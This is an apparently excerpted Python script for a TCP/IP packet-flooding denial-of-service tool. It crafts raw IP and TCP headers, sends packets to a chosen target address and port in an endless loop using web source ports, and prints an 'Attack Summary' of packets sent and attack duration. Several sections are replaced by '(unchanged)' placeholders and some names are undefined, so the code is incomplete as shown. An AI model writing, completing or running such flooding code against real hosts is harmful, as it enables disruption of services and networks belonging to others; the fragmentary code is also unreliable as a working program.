import sys
import socket
import threading
import time

# Global variable definitions.
p_num = 0
successful_packets = 0
failed_packets = 0
mut = threading.Lock()

def csum(data):
    # ... (unchanged)

def bilgi():
    global p_num, successful_packets, failed_packets, mut, time_diff
    time.sleep(1)
    with mut:
        print("\n\n----------------------------------------------------------")
        print("\n\nAttack Summary:")
        print("Number of PACKETS: {}\t Successful: {}\t Failed: {}".format(p_num, successful_packets, failed_packets))
        print("Attack Time: {} seconds \n\n".format(time_diff))
        print("----------------------------------------------------------\n\n")
        sys.exit(0)

def attack(target_ip, port):
    global p_num, successful_packets, failed_packets, mut, time_diff
    signal(SIGINT, bilgi)
    # ... (unchanged)

    ip_checksum = csum(ip_header)
    ip_header = ip_header[:10] + struct.pack('H', ip_checksum) + ip_header[12:]

    tcp_source_ports = [80, 443]  # Web Ports (HTTP and HTTPS)
    
    while True:
        for source_port in tcp_source_ports:
            # ... (unchanged)

            try:
                packet = ip_header + tcp_header
                sock.sendto(packet, (target_ip, port))

                with mut:
                    p_num += 1
                    successful_packets += 1
                    if p_num == 1:
                        print("[+] Attack has been started!\n")

            except Exception as e:
                with mut:
                    failed_packets += 1

if __name__ == "__main__":
    # ... (unchanged)

    try:
        while True:
            time.sleep(1)
            time_diff = time.time() - start_time
    except KeyboardInterrupt:
        bilgi()
